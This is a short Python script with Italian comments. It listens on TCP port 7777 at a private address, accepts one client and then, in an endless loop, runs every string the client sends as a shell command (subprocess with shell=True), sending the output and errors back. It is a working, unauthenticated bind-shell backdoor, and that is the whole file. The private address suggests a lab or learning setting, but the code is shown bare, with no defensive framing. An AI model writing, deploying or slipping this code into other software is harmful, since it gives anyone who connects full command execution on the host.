import socket
import subprocess
from ctypes.wintypes import INT

HOST = '192.168.90.101'  # Indirizzo IP del server
PORT = 7777  # Porta su cui il server ascolta

# Crea un socket TCP/IP
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Associa il socket all'indirizzo e alla porta
server_socket.bind((HOST, PORT))

# Inizia l'ascolto delle connessioni in entrata
server_socket.listen(1)

print('Server in ascolto su {}:{}'.format(HOST, PORT))

# Accetta la connessione dal client
client_socket, client_address = server_socket.accept()

print('Connessione accettata da:', client_address)

# Ricevi dati dal client
data = client_socket.recv(4096)
print('Dati ricevuti:', data.decode())

# Invia una risposta al client
response = 'Ciao client!'
client_socket.sendall(response.encode())

# Ciclo infinito per l'invio e la ricezione dei comandi
while True:
    print("[-] Awaiting commands...")
    command = client_socket.recv(4096)  # Ricevi il comando dal client
    command = command.decode()  # Decodifica il comando da byte a stringa

    # Esegui il comando utilizzando il modulo subprocess
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()  # Leggi l'output del comando
    output_error = op.stderr.read()  # Leggi gli eventuali errori dell'esecuzione del comando

    print("[-] Sending response...")
    # Invia l'output e gli errori al client
    client_socket.send(output + output_error)

# Chiudi le socket alla fine dell'esecuzione
client_socket.close()
server_socket.close()
